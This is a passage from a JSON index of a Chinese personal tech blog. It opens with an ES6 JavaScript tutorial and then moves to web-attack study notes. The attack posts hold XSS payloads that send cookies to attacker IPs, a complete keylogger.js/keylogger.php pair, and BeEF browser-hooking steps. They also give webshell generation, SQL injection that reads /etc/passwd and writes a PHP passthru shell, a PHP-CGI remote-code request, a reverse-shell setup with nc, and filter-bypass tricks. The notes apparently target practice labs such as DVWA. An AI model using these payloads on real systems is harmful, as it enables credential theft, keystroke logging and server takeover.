入门》","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://recallhyx.github.io/tags/javascript/"}]},{"title":"JavaScript ES6介绍及一些有用的语法特性(let 和 const，变量的解构赋值)","slug":"ES6（1）","date":"2018-02-06T05:04:54.000Z","updated":"2018-02-07T13:44:05.871Z","comments":true,"path":"2018/02/06/ES6（1）/","link":"","permalink":"https://recallhyx.github.io/2018/02/06/ES6（1）/","excerpt":"","text":"ES6简介 ECMAScript 6.0（简称 ES6）是 JavaScript 语言的下一代标准，已经在 2015 年 6 月正式发布了。它的目标，是使得 JavaScript 语言可以用来编写复杂的大型应用程序，成为企业级开发语言。 ES6是下一代 JavaScript 的标准，也就是说，现在的浏览器用的 JavaScript 脚本大部分是以前的版本，就会有很多怪异的难以理解的行为，而ES6就是为了让 JavaScript 更好的理解而制定的标准 ES6和ECMAScript 2015的关系 ECMAScript 2015（简称 ES2015）这个词，也是经常可以看到的。它与 ES6 是什么关系呢？2011 年，ECMAScript 5.1 版发布后，就开始制定 6.0 版了。因此，ES6 这个词的原意，就是指 JavaScript 语言的下一个版本。但是，因为这个版本引入的语法功能太多，而且制定过程当中，还有很多组织和个人不断提交新功能。事情很快就变得清楚了，不可能在一个版本里面包括所有将要引入的功能。常规的做法是先发布 6.0 版，过一段时间再发 6.1 版，然后是 6.2 版、6.3 版等等。但是，标准的制定者不想这样做。他们想让标准的升级成为常规流程：任何人在任何时候，都可以向标准委员会提交新语法的提案，然后标准委员会每个月开一次会，评估这些提案是否可以接受，需要哪些改进。如果经过多次会议以后，一个提案足够成熟了，就可以正式进入标准了。这就是说，标准的版本升级成为了一个不断滚动的流程，每个月都会有变动。标准委员会最终决定，标准在每年的 6 月份正式发布一次，作为当年的正式版本。接下来的时间，就在这个版本的基础上做改动，直到下一年的 6 月份，草案就自然变成了新一年的版本。这样一来，就不需要以前的版本号了，只要用年份标记就可以了。ES6 的第一个版本，就这样在 2015 年 6 月发布了，正式名称就是《ECMAScript 2015 标准》（简称 ES2015）。2016 年 6 月，小幅修订的《ECMAScript 2016 标准》（简称 ES2016）如期发布，这个版本可以看作是 ES6.1 版，因为两者的差异非常小（只新增了数组实例的includes方法和指数运算符），基本上是同一个标准。根据计划，2017 年 6 月发布 ES2017 标准。因此，ES6 既是一个历史名词，也是一个泛指，含义是 5.1 版以后的 JavaScript 的下一代标准，涵盖了 ES2015、ES2016、ES2017 等等，而 ES2015 则是正式名称，特指该年发布的正式版本的语言标准。本书中提到 ES6 的地方，一般是指 ES2015 标准，但有时也是泛指“下一代 JavaScript 语言”。 部署进度各大浏览器的最新版本，对 ES6 的支持可以查看kangax.github.io/es5-compat-table/es6/。随着时间的推移，支持度已经越来越高了，超过 90%的 ES6 语法特性都实现了。这里，推荐我一直在用的 TypeScript ，它是微软开发的编程语言，是 JavaScript 的超集，使用 TypeScript编写，可以使用 ES6的特性，在编码的时候就会编译出一个对应的 js 文件，里面就是标准的 js代码。一个TypeScript应用可以利用已存在的JavaScript脚本。编译后的TypeScript脚本也可以在JavaScript中使用。 ES6一些有用的语法特性let 和 constJavaScript变量声明命令 var 很让人头疼，通过 var 定义的变量，它的作用域是在 function 或任何外部已经被声明的 function，是全域的 。最常见的就是在循环后还能引用到值1234567var a = [];for (var i = 0; i &lt; 10; i++) &#123; a[i] = function () &#123; console.log(i); &#125;;&#125;a[6](); // 10 上述代码中a[6]()的值就是循环后i的值，因为i是var命令声明的，在全局范围内有效，所以全局只有一个变量i。每一次循环，i的值都会改变，而循环内被赋给数组a的函数内部的console.log(i)，里面的i指向的就是全局的i，也就是说，所有数组a的成员里面的i，指向的都是同一个i，导致运行时输出的最后一轮的i的值，就是10var还有一种情况就是 变量提升什么是变量提升？简单来说就是变量可以在声明之前使用，值为undefined，相当于变量定义的语句被移动到作用域的最顶部注意：函数声明和变量定义存在变量提升，但函数表达式没有变量提升123456/*变量提升*/foo = 2;var foo;// 被隐式地解释为:var foo;foo = 2; 1234567891011catName(\"Chloe\");function catName(name) &#123; console.log(\"My cat's name is \" + name);&#125;// \"My cat's name is Chloe\"// 等价于/*函数声明提升*/function catName(name) &#123; console.log(\"My cat's name is \" + name);&#125;catName(\"Tigger\"); 在代码中使用一个函数或变量，在声明该函数或变量之前，这种行为很怪，这个时候，let的出现，解决了作用域和变量提升的问题。ES6 新增了let命令，用来声明变量。它的用法类似于var，但是所声明的变量，只在let命令所在的代码块内有效。上述循环用let则不会出现问题1234567var a = [];for (let i = 0; i &lt; 10; i++) &#123; a[i] = function () &#123; console.log(i); &#125;;&#125;a[6](); // 6 变量提升的问题也得到解决1234567// var 的情况console.log(foo); // 输出undefinedvar foo = 2;// let 的情况console.log(bar); // 报错ReferenceErrorlet bar = 2; let实际上为 JavaScript 新增了块级作用域，有了块级作用域，就不会出现循环变量泄漏为全局变量1234for(var i=0;i&lt;3;i++)&#123; //&#125;console.log(i);//3 另外一个命令是const，声明一个只读的常量，一旦声明，常量的值就不能改变，这就意味着，const一旦声明变量，就必须立即初始化，不能留到以后再赋值12const a;//Uncaught SyntaxError: Missing initializer in const declaration const实际上保证的，并不是变量的值不得改动，而是变量指向的那个内存地址不得改动。对于简单类型的数据（数值、字符串、布尔值），值就保存在变量指向的那个内存地址，因此等同于常量。但对于复合类型的数据（主要是对象和数组），变量指向的内存地址，保存的只是一个指针，const只能保证这个指针是固定的，至于它指向的数据结构是不是可变的，就完全不能控制了。因此，将一个对象声明为常量必须非常小心。123456const person=&#123;&#125;;person.age=18;person.age;//18person = &#123;&#125;;//Uncaught TypeError: Assignment to constant variable. 上面代码中，常量person储存的是一个地址，这个地址指向一个对象。不可变的只是这个地址，即不能把person指向另一个地址，但对象本身是可变的，所以依然可以为其添加新属性。const和let的作用域相同，只在声明所在的块级作用域内有效，除此之外，ES6 还规定了暂时性死区（temporal dead zone，简称 TDZ）。如果区块中存在let和const命令，这个区块对这些命令声明的变量，从一开始就形成了封闭作用域。凡是在声明之前就使用这些变量，就会报错。1234567891011if (true) &#123; // TDZ开始 tmp = 'abc'; // ReferenceError console.log(tmp); // ReferenceError let tmp; // TDZ结束 console.log(tmp); // undefined tmp = 123; console.log(tmp); // 123&#125; “暂时性死区”也意味着typeof不再是一个百分之百安全的操作。123typeof x;let x;//Uncaught ReferenceError: x is not defined 作为比较，如果一个变量根本没有被声明，使用typeof反而不会报错。12typeof y;\"undefined\" 所以，在没有let之前，typeof运算符是百分之百安全的，永远不会报错。现在这一点不成立了。这样的设计是为了让大家养成良好的编程习惯，变量一定要在声明之后使用，否则就报错。 变量的解构赋值ES6 允许按照一定模式，从数组和对象中提取值，对变量进行赋值，这被称为解构（Destructuring）。let [a, b, c] = [1, 2, 3]上面代码表示，可以从数组中提取值，按照对应位置，对变量赋值。本质上，这种写法属于“模式匹配”，只要等号两边的模式相同，左边的变量就会被赋予对应的值。下面是一些使用嵌套数组进行解构的例子。1234567891011121314151617181920let [foo, [[bar], baz]] = [1, [[2], 3]];foo // 1bar // 2baz // 3let [ , , third] = [\"foo\", \"bar\", \"baz\"];third // \"baz\"let [x, , y] = [1, 2, 3];x // 1y // 3let [head, ...tail] = [1, 2, 3, 4];head // 1tail // [2, 3, 4]let [x, y, ...z] = ['a'];x // \"a\"y // undefinedz // [] 如果解构不成功，变量的值就等于undefined。12let [foo] = [];let [bar, foo] = [1]; 以上两种情况都属于解构不成功，foo的值都会等于undefined。 另一种情况是不完全解构，即等号左边的模式，只匹配一部分的等号右边的数组。这种情况下，解构依然可以成功。12345678let [x, y] = [1, 2, 3];x // 1y // 2let [a, [b], d] = [1, [2, 3], 4];a // 1b // 2d // 4 上面两个例子，都属于不完全解构，但是可以成功。 如果等号的右边不是数组（或者严格地说，不是可遍历的结构），那么将会报错。1234567// 报错let [foo] = 1;let [foo] = false;let [foo] = NaN;let [foo] = undefined;let [foo] = null;let [foo] = &#123;&#125;; 上面的语句都会报错，因为等号右边的值，要么转为对象以后不具备 Iterator 接口（前五个表达式），要么本身就不具备 Iterator 接口（最后一个表达式）。变量的解构赋值用途很多。（1）交换变量的值1234let x = 1;let y = 2;[x, y] = [y, x]; 上面代码交换变量x和y的值，这样的写法不仅简洁，而且易读，语义非常清晰。 （2）从函数返回多个值 函数只能返回一个值，如果要返回多个值，只能将它们放在数组或对象里返回。有了解构赋值，取出这些值就非常方便。12345678910111213141516// 返回一个数组function example() &#123; return [1, 2, 3];&#125;let [a, b, c] = example();// 返回一个对象function example() &#123; return &#123; foo: 1, bar: 2 &#125;;&#125;let &#123; foo, bar &#125; = example(); （3）函数参数的定义 解构赋值可以方便地将一组参数与变量名对应起来。1234567// 参数是一组有次序的值function f([x, y, z]) &#123; ... &#125;f([1, 2, 3]);// 参数是一组无次序的值function f(&#123;x, y, z&#125;) &#123; ... &#125;f(&#123;z: 3, y: 2, x: 1&#125;); （4）提取 JSON 数据 解构赋值对提取 JSON 对象中的数据，尤其有用。12345678910let jsonData = &#123; id: 42, status: \"OK\", data: [867, 5309]&#125;;let &#123; id, status, data: number &#125; = jsonData;console.log(id, status, number);// 42, \"OK\", [867, 5309] 上面代码可以快速提取 JSON 数据的值。 （5）函数参数的默认值1234567891011jQuery.ajax = function (url, &#123; async = true, beforeSend = function () &#123;&#125;, cache = true, complete = function () &#123;&#125;, crossDomain = false, global = true, // ... more config&#125;) &#123; // ... do stuff&#125;; 指定参数的默认值，就避免了在函数体内部再写var foo = config.foo || ‘default foo’;这样的语句。 （6）遍历 Map 结构 任何部署了 Iterator 接口的对象，都可以用for…of循环遍历。Map 结构原生支持 Iterator 接口，配合变量的解构赋值，获取键名和键值就非常方便。1234567891011121314151617181920const map = new Map();map.set('first', 'hello');map.set('second', 'world');for (let [key, value] of map) &#123; console.log(key + \" is \" + value);&#125;// first is hello// second is world如果只想获取键名，或者只想获取键值，可以写成下面这样。// 获取键名for (let [key] of map) &#123; // ...&#125;// 获取键值for (let [,value] of map) &#123; // ...&#125; （7）输入模块的指定方法 加载模块时，往往需要指定输入哪些方法。解构赋值使得输入语句非常清晰。1const &#123; SourceMapConsumer, SourceNode &#125; = require(\"source-map\"); 参考：阮一峰《ECMAScript 6 入门》","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://recallhyx.github.io/tags/javascript/"}]},{"title":"CSRF和WebShell","slug":"CSRF和WebShell","date":"2018-02-05T08:08:24.000Z","updated":"2018-03-20T13:05:31.576Z","comments":true,"path":"2018/02/05/CSRF和WebShell/","link":"","permalink":"https://recallhyx.github.io/2018/02/05/CSRF和WebShell/","excerpt":"","text":"CSRF（Cross-site request forgery）与xss经常混淆，可以从信任的角度来区分XSS：利用用户对站点的信任CSRF：利用站点对已经身份认证的信任结合社会工程学在身份认证会话过程中实现攻击 修改帐号密码、个人信息（电话、收货地址） 发送伪造的业务请求（网银、购物、投票） 关注他人社交帐号、推送博文 在用户非自愿、不知情的情况下提交请求 CSRF 典型的场景：攻击通过在授权用户访问的页面中包含链接或者脚本的方式工作。例如：一个网站用户Bob可能正在浏览聊天论坛，而同时另一个用户Alice也在此论坛中，并且后者刚刚发布了一个具有Bob银行链接的图片消息。设想一下，Alice编写了一个在Bob的银行站点上进行取款的form提交的链接，并将此链接作为图片src。如果Bob的银行在cookie中保存他的授权信息，并且此cookie没有过期，那么当Bob的浏览器尝试装载图片时将提交这个取款form和他的cookie，这样在没经Bob同意的情况下便授权了这次事务。 漏洞利用条件： 被害用户已经完成身份认证 新请求的提交不需要重新身份认证或确认机制 攻击者必须了解WEB APP请求的参数构造 诱使用户出发攻击的指令（社会工程学） 利用Burpsuite的CSRF Poc Generator可以生成代码 点击之后就会自动生成html代码自动扫描程序的检测方法 在请求和相应过程中检查是否存在anti-CSRF token名 检查服务器是否验证anti-CSRF token的名值 检查token中可编辑的字符串 检查referrer 头是否可以伪造 对策 Captcha anti-CSRF token Referrer头 降低会话超时时间 WEBSHELL介绍webshell就是一些放置在服务器的脚本文件通过参数来执行操作系统的一些指令一些WEBSHELL工具介绍： 中国菜刀据说官网是：http://www.maicaidao.co/ 注意：不确定这个版本是否有木马，网上有很多版本安插了自己的木马，如果执行的话就中病毒了，所以请保证在虚拟机执行，之后恢复操作方式：将菜刀文件下的服务器代码注入到服务器，然后执行客户端程序，就能连上目标服务器 WeBaCoo（Web Backdoor Cookie）类终端的shell，编码通信内容通过cookie头传输，隐蔽性较强，只支持phpcm：base64编码的命令cn：服务器用于返回数据的cookie头的名cp：返回信息定界符 Weevely隐蔽的类终端php webshell30多个管理模块 执行系统命令，浏览文件系统 检查服务器常见配置错误 创建正向，反向TCP shell 连接 通过目标 计算机代理HTTP流量 从目标计算机运行端口扫描，渗透内网 支持连接密码 由于中国菜刀网上不确定的版本太多，就不介绍了，主要介绍WeBaCoo、Weevely WeBaCoo生成服务端webacoo -g -o a.php然后把生成的a.php注入到目标服务器最后生成客户端程序webacoo -t -u http://1.1.1.1/a.php连接目标服务器更多参数的使用可以webacoo -h查看 Weevely生成服务端weevely generate &lt;password&gt; b.php其中的是自己设置的连接密码，以后客户端都要使用连接密码，生成的b.php文件在/var/share/weevely目录下然后把b.php注入到目标服务器最后连接weevely http://1.1.1.1/b.php &lt;password&gt;连接目标服务器在连接完目标服务器的shell下输入命令help可以查看Weevely的模块 关于怎么注入文件，之前的博文已经有介绍了，可以去看看学习一下","categories":[{"name":"安全","slug":"安全","permalink":"https://recallhyx.github.io/categories/安全/"}],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://recallhyx.github.io/tags/漏洞/"}]},{"title":"XSS常用攻击手段","slug":"XSS常用攻击手段","date":"2018-01-31T06:48:21.000Z","updated":"2018-01-31T06:52:52.360Z","comments":true,"path":"2018/01/31/XSS常用攻击手段/","link":"","permalink":"https://recallhyx.github.io/2018/01/31/XSS常用攻击手段/","excerpt":"","text":"XSS（cross-site scripting） 通过WEB站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击目的注入客户端脚本代码，盗取cookie、重定向 使用场景12345直接嵌入html：&lt;script&gt; alert('xss);&lt;/script&gt;元素标签时间：&lt;body onload=alert('xss')&gt;图片标签：&lt;img src=\"javascript:alert('xss);\"&gt;其他标签：&lt;iframe&gt;，&lt;div&gt;，&lt;link&gt;DOM对象，篡改页面内容 漏洞形成的根源： 服务器对用户提交数据过滤不严 提交给服务器的脚本被直接返回给其他客户端执行 脚本在客户端执行恶意操作 XSS漏洞类型： 存储型（持久型） 反射型（非持久） DOM 型 怎么知道网站是否有漏洞：提交的数据原封不动的返回 提交表单后 反射型漏洞注入：1234567891011&lt;script&gt;alert('xss');&lt;/script&gt;&lt;a href='' onlick=alert('xss');&gt;&lt;/a&gt;&lt;img src=http://192.168.1.1/a.jpg onerror=alert('xss');&lt;/script&gt;（当图片找不到就会执行onerror）&lt;script&gt;window.location='http://192.168.1.1'&lt;/script&gt;（页面重定向）&lt;iframe src=\"http://192.168.1.1/victim\" height=\"0\" width=\"0\"&gt;&lt;/iframe&gt;&lt;script&gt;new Image().src=\"http://1.1.1.1/c.php?output=\"+document.cookie;&lt;/iframe&gt;（将cookie发送到自己的主机）&lt;script&gt;document.body.innerHTML=\"&lt;div style=visibility:visible;&gt;&lt;h1&gt;HELLO&lt;/h1&gt;&lt;/div&gt;;\"&lt;/script&gt;&lt;script src=\"http://1.1.1.1/a.js\"&gt;&lt;/script&gt;a.js: var img = new Image();img.src=\"http://1.1.1.1/cookie.php?cookie=\"+document.cookie（让浏览器去包含一个有木马的js文件，这样有隐蔽性） 反射型漏洞例子：键盘记录器原理：在被攻击者的电脑浏览器上调用指定ip地址上的js文件，即利用XSS输入以下脚本&lt;script src=&quot;http://1.1.1.1/keylogger.js&quot;&gt;&lt;/script&gt; 在/var/www/html/目录下新建keylogger.js keylogger.js1234567891011document.onkeypress = function(evt) &#123; evt = evt || window.event; key = String.fromCharCode(evt.charCode) if(key) &#123; var http = new XMLHttpRequest(); var param = encodeURI(key); http.open(\"POST\",\"http://1.1.1.1/keylogger.php\",true);//注意：把ip地址改成自己的ip http.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\"); http.send(\"key=\"+param); &#125; &#125; 由于我们是由keylogger.php文件接收键盘记录的，所以还需要一个php脚本 keylogger.php1234567&lt;?php $key = $_POST['key']; $logfile = \"keylog.txt\"; $fp = fopen($logfile,\"a\"); fwrite($fp,$key); fclose($fp);?&gt; 然后新建一个keylog.txt，用来记录被攻击者的键盘记录，改写它的权限chmod 777 keylog.txt然后执行service apache2 start开启apache，可以用netstat -pantu | grep :80查看被占用的进程然后杀掉确保能够访问到刚才写的js脚本 最后就可以在有XSS漏洞的地方输入&lt;script src=&quot;http://1.1.1.1/keylogger.js&quot;&gt;&lt;/script&gt;注入脚本 提交之后，可以看到url地址已经变了，而且被攻击者也有提示输入成功，这个时候我们就可以敲键盘，没有焦点也可以记录键盘，这里为了显示方便，我们在输入框输入hello hacker Xsser–自动化工具 图形化/命令行界面（图形化只需要在命令行输入xsser --gtk） 绕过服务器端输入筛选10进制/16进制unescape() xsser -u “http://172.16.242.128/dvwa/vulnerabilities/“ -g “xss_r/?name=” –cookie=”security=low; PHPSESSID=1f7c245b5c6145fbeb0f36d5e601ef2f” -s -v –reverse-check 参数12345-g（Get方法） -p （Post方法）-s （在结束后显示统计信息）-v （显示详细信息）--reverse-check （发送一个含有本机连接的js文件，基于连接是否被建立来判断时候有漏洞）--heuristic （检查被过滤的字符） 对payload编码，绕过服务器端筛选过滤12345678910--Str Use method String.FromCharCode()--Une Use Unescape() function--Mix Mix String.FromCharCode() and Unescape()--Dec Use Decimal encoding--Hex Use Hexadecimal encoding--Hes Use Hexadecimal encoding with semicolons--Dwo Encode IP addresses with DWORD--Doo Encode IP addresses with Octal--Cem=CEM Set different 'Character Encoding Mutations' (reversing obfuscators) (ex: 'Mix,Une,Str,Hex') 注入技术1234567--Coo COO - Cross Site Scripting Cookie injection--Xsa XSA - Cross Site Agent Scripting--Xsr XSR - Cross Site Referer Scripting--Dcp DCP - Data Control Protocol injections--Dom DOM - Document Object Model injections--Ind IND - HTTP Response Splitting Induced code--Anchor ANC - Use Anchor Stealth payloader (DOM shadows!) 其他可以用的参数1234567--Fp=FINALPAYLOAD OWN - Exploit your own code--Fr=FINALREMOTE REMOTE - Exploit a script -remotely---Doss DOSs - XSS (server) Denial of Service--Dos DOS - XSS (client) Denial of Service--B64 B64 - Base64 code encoding in META tag (rfc2397)--Onm ONM - Use onMouseMove() event--Ifr IFR - Use &lt;iframe&gt; source tag 存储型XSS 长期存储于服务器端 每次用户访问都会被执行js脚本 漏洞常见于有留言板之类功能的网站，因为评论或留言之后我们可以看到自己刚才输入的东西。这样，只要一次注入，其他人打开这个网站的时候，就会加载这个脚本，就可以盗取cookie或者记录键盘有一些评论会限制字数，不能注入完整的脚本，但是我们可以用burpsuite截断代理，截断请求，然后在请求里面注入脚本，关于怎么使用burpsuite我在之前有发过一篇工具介绍，可以参考那篇文章 对于XSS，需要对变量输入和变量输出做数据清洗（符号编码，去除一些字符），才能完全补上这个漏洞 DOM型XSSDOM ：一套js和其他语言可以调用的API1&lt;script&gt;var img=document.createElement(\"img\");img.src=\"http://1.1.1.1:88/log?\"+escape(document.cookie);&lt;/script&gt; BEEF攻击框架 生成、交付payload ruby语言编写 服务器端：管理hooked客户端 客户端：运行于客户端浏览器的 js 脚本（hook）浏览器攻击面： 应用普遍转移到B/S架构，浏览器成为统一客户端程序 结合社会工程学方法对浏览器进行攻击 攻击浏览器用户 通过注入的JS脚本，利用浏览器攻击其他网站攻击手段： 利用网站xss漏洞实现攻击，能利用存储型xss漏洞更好 诱使客户端访问含有hook的伪造站点 结合中间人攻击注入hook脚本常见用途： 键盘记录器 网络扫描 浏览器信息收集 绑定shell 与metasploit 集成使用方式：在kali2.0的左侧就有集成好的Beef，点击之后在终端可以看到提示，在浏览器中输入url就能进入到web管理页面，默认帐号和密码都是beef 在有xss漏洞的地方注入终端提示的代码，注意，要把ip地址改为beef启动的机器的ip地址 之后就能在 beef管理页面看到被hooked的网站 hooked客户端做的一切操作都会记录在log标签commands标签： 绿色：表示模块适合目标浏览器，并且执行结果不被客户端可见 红色：表示模块不适用于当前用户，有些红色模块也可以正常执行 橙色：模块可用，但结果对用户可见（CAM弹窗申请权限等） 灰色：模块未在目标浏览器上测试过 这个标签包含很多模块，可以对hooked客户端进行各种攻击，包括打开摄像头，记录表单，甚至可以利用hooked的浏览器进行DDOS攻击，就是所谓的僵尸机，有很强的隐蔽性","categories":[{"name":"安全","slug":"安全","permalink":"https://recallhyx.github.io/categories/安全/"}],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://recallhyx.github.io/tags/漏洞/"}]},{"title":"手动漏洞挖掘（二）","slug":"手动漏洞挖掘（二）","date":"2018-01-27T07:25:03.000Z","updated":"2018-02-01T07:57:30.343Z","comments":true,"path":"2018/01/27/手动漏洞挖掘（二）/","link":"","permalink":"https://recallhyx.github.io/2018/01/27/手动漏洞挖掘（二）/","excerpt":"","text":"SQL 注入 服务端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器基于报错的检测方法 123‘ 单引号，在输入框输入一个单引号，如果数据库sql语句是直接拼接的，就会识别不了指令而报错%() 基于布尔的检测–用来猜测服务器的SQL 语句结构121' and '1'='1 / 1' and '11' and '1'='2 / 1' and '0 检测数据库表有多少个字段123' order by 数字--（空格） （--就是注释的意思，在--后面加空格才能使注释生效）（例：如果user表只有4个字段，那么以下sql语句会报错：select * from user order by 5，而以下sql语句正常：select * from user order by 4） 联合查询12345678' union select 1,2-- （空格）（还是需要在--后面加空格，由上面的注入得出该输入多少个数字，有4个字段就输：1,2,3,4，这样就能得出查询的对应字段的名称）' union select user(),version()-- （空格）（还是需要在--后面加空格，user(),version()都是数据库默认的函数，得到用户和版本号，也可以根据版本号来看用的是什么数据库，比如MySql数据库版本号可能为5，但Oracle数据库版本号不可能为5,太久了，其他数据库函数：database()--数据库名称）ASCII转字符：char('字符')连接字符串：CONCAT_WS(CHAR(32,58,32),user(),database(),version())（连接字符串，就能把多个函数合并为一个，只占一个位置，CHAR(32,58,32)就是以空格：空格的格式分隔开来） 针对MySQL数据库的一些SQL注入 information_schema数据库是MySQL系统自带的数据库，它提供了数据库元数据的访问方式。感觉information_schema就像是MySQL实例的一个百科全书，记录了数据库当中大部分我们需要了结的信息，比如字符集，权限相关，数据库实体对象信息，外检约束，分区，压缩表，表信息，索引信息，参数，优化，锁和事物等等。通过information_schema我们可以窥透整个MySQL实例的运行情况，可以了结MySQL实例的基本信息，甚至优化调优，维护数据库等 简单来说，我们只要利用information_schema 就能知道数据库存放了什么表，表里的字段是什么12345678910所有库所有表/统计每库中表的数量' union select table_name,table_schema from information_schema.tables--+' union select table_schema,count(*) from information_schema.tables group by table_schema--+dvwa库中的表名' union select table_name,table_schema from information_schema.tables where table_schema='dvwa'--+查到表名users后就查表中的字段' union select table_name,column_name from information_schema.columns where table_schema='dvwa' and table_name='users'--+之后查询user，password的内容' union select user,password from dvwa.users--+' union select null,concat(user,0x3a,password) from users--+（只是格式变了） 读取文件&#39; union select null,load_file(&#39;/etc/passwd&#39;)--+写入文件（利用 into dumpfile，这个指令还能把二进制还原，利用这个我们可以先把要传输的代码用二进制编码后传到数据库）123' union select null,\"&lt;?php passthru($_GET['cmd']); ?&gt;\" into DUMPFILE \"/tmp/a.php\"--+(tmp目录是所有用户都有权限读写执行)cat shell.php | xxd -ps | tr -d '\\n'（这句话就是把shell.php 下的内容转成十六进制，并且去掉换行符）' union select null, (0x十六进制内容) into dumpfile \"/tmp/a.php\"--+（注意：get请求有最大长度限制，所以内容太多会导致注入失败） 保存数据库&#39; union select null, concat(user,0x3a,password) from users into OUTFILE &#39;/tmp/a.db&#39;当数据库没有权限查看information_schema时，或者数据库限制不能使用 union,order by 查询猜表有没有这个列，重复的工作可以用（Burp 的intruder用字典）1' and column is null--+ （column就是要替换的列，如果没有该列，就会报错，有的话就正常） 猜当前表表名（假如由上一步得出的其中一个列名为user）and table.user is null--+ （table就是要替换的表名）猜数据库的其他表&#39; and (select count(*) from table)&gt;0--+ （table就是要替换的表名）猜字段的内容12' or user='admin' or user like '%a% 当数据库可写&#39;; update users set user=&#39;hyx&#39; where user=&#39;admin（两条语句先后执行） SQL盲注 不显示数据库内建的报错信息，替换为通用的错误提示，sql注入将无法依据报错信息判断注入语句的执行结果，即 盲 思路：既然无法基于报错信息判断结果，就基于逻辑真假的不同结果判断12341' and 1=11' and 1=21' order by 5--+（如果sql语句有两个字段的话为假）1' order by 2--+（如果sql语句有两个字段的话为真） 如果有sql注入漏洞的话，之后的操作都合上一篇的指令差不多","categories":[{"name":"安全","slug":"安全","permalink":"https://recallhyx.github.io/categories/安全/"}],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://recallhyx.github.io/tags/漏洞/"}]},{"title":"手动漏洞挖掘（一）","slug":"手动漏洞挖掘（一）","date":"2018-01-27T07:20:44.000Z","updated":"2018-02-01T07:58:29.880Z","comments":true,"path":"2018/01/27/手动漏洞挖掘（一）/","link":"","permalink":"https://recallhyx.github.io/2018/01/27/手动漏洞挖掘（一）/","excerpt":"","text":"手动挖掘原则 所有变量 所有头cookie中的变量+逐个变量删除 默认安装漏洞 windows默认安装漏洞 phpMyAdmin/setup Ubuntu/Debian 默认安装 PHP5-cgi 可直接访问 /cgi-bin/php5 和 /cgi-bin/php123456POST http://192.168.133.132/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1Host: 192.168.20.10passthru('ls');die();?&gt; 以上这段放在Burpsuite的Repeater重放攻击，修改主机地址和目标ip地址，就能实现攻击，在php代码里面修改命令就能看到该服务器权限下能执行的命令结果 php反弹shell它在kali的位置/usr/share/webshells/php/php-reverse-shell.php修改一下，把IP换成本机的IP地址然后将所有内容复制下来复制到在burpsuite的body中 如配置文件中侦听对应的端口nc -nvvlp 1234再发送请求，就能在终端看到信息了 接下来输入的系统指令只要有权限就能执行 命令行注入漏洞如果网站有直接调用系统指令，如ping之类，可以用以下指令注入1234; 分号，代表与指令分隔 例：ping 172.16.242.128;ls 执行完ping之后就执行ls&amp;&amp; 双与，代表前面一个指令成功后，才能执行后面一个指令 例：ping 172.16.242.128&amp;&amp;ls 在ping指令成功后才会执行ls&amp; 单与，代表两条命令同时执行|| 双或，代表当前面一个命令执行失败，才执行后面一个指令 目录权限限制不严/文件包含漏洞针对运行php的服务器的远程文件包含漏洞，需要服务器的/etc/php5/cgi/php.ini中allow_url_include=On，然后重启apache服务器才有用 一句话木马&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]); ?&gt;特征但不绝对：123?page=a.php?home=b.html?file=content 经典测试方法：12345?file=../../../../etc/passwd?page=file:///etc/passwd?home=main.cgi?page=http://www.a.com/1.phphttp://1.1.1.1/../../../../dir/file.txt 绕过字符过滤12345. 点，有一些应用对图片判断是以.png结尾，来判断是不是一张图片的，这个时候只需要 a.php.png，就能绕过检查%00 空，作为截断，有一些应用的文件检查是从头开始检查的，如果遇到%00,就表示结束，不会再继续，例如a.doc%00.php ，实际上是一个php文件，但是应用的检查以为是doc文件在请求中插入过滤 如果服务器过滤链接http://这串字符，这个时候只需要在这串字符中间再插入这串字符，如在h插入，变成hhttp://ttp://这样服务器就会过滤掉中间的http://，并把过滤后的字符串拼接回去 kali攻击字典放在/usr/share/wfuzz/wordlist/vulns 文件上传漏洞12将文件名后缀修改截断代理，将content-type修改为允许的类型 怎么解决文件上传漏洞123限制上传目录的权限修改上传后文件的命名模糊上传文件目录的路径","categories":[{"name":"安全","slug":"安全","permalink":"https://recallhyx.github.io/categories/安全/"}],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://recallhyx.github.io/tags/漏洞/"}]},{"title":"安全工具介绍（三）","slug":"安全工具介绍（三）","date":"2018-01-25T07:09:40.000Z","updated":"2018-02-01T08:18:30.160Z","comments":true,"path":"2018/01/25/安全工具介绍（三）/","link":"","permalink":"https://recallhyx.github.io/2018/01/25/安全工具介绍（三）/","excerpt":"","text":"SQLMAP特点 开源sql注入漏洞监测、利用的工具 检测动态页面中get/post 参数、cookie、http头 数据榨取 文件系统访问 操作系统命令执行 引擎强大、特性丰富 XSS漏洞检测 五种漏洞监测技术 基于布尔的盲注检测 基于时间的盲注检测&#39;and (select * from (select(sleep(20)))a)--+ 基于错误的检测 基于union联合查询的检测适用于通过for循环直接输出联合查询结果，否则只显示第一项结果 基于堆叠查询的检测;堆叠多个查询语句适用于非select的数据修改、删除的操作 SQLMAP参数介绍 TARGET:123456789101112Target: At least one of these options has to be provided to define the target(s) -d DIRECT Connection string for direct database connection -u URL, --url=URL Target URL (e.g. \"http://www.site.com/vuln.php?id=1\") -l LOGFILE Parse target(s) from Burp or WebScarab proxy log file -x SITEMAPURL Parse target(s) from remote sitemap(.xml) file -m BULKFILE Scan multiple targets given in a textual file -r REQUESTFILE Load HTTP request from a file -g GOOGLEDORK Process Google dork results as target URLs -c CONFIGFILE Load options from a configuration INI file Get方法12345sqlmap -u \"http://172.16.242.128/mutillidae/index.php?page=user-info.php&amp;username=1&amp;password=1&amp;user-info-php-submit-button=View+Account+Details\" -p username -f （-p的意思就是只指定一个变量，-f就是查看数据库版本）--user（就是查看数据库用户）--dbs（目标数据库有什么库）--schema（查看元数据库） Post方法1234使用http请求文件（brupsuite）：sqlmap -r request.txt（使用burpsuite截断代理并将截断的post中raw标签内的全部内容贴到request.txt文件，不能有多余的空行，要和burpsuite中看到的一样）使用brupsuite log文件：sqlmap -l log.txt（在burpsuite的option中开启log） 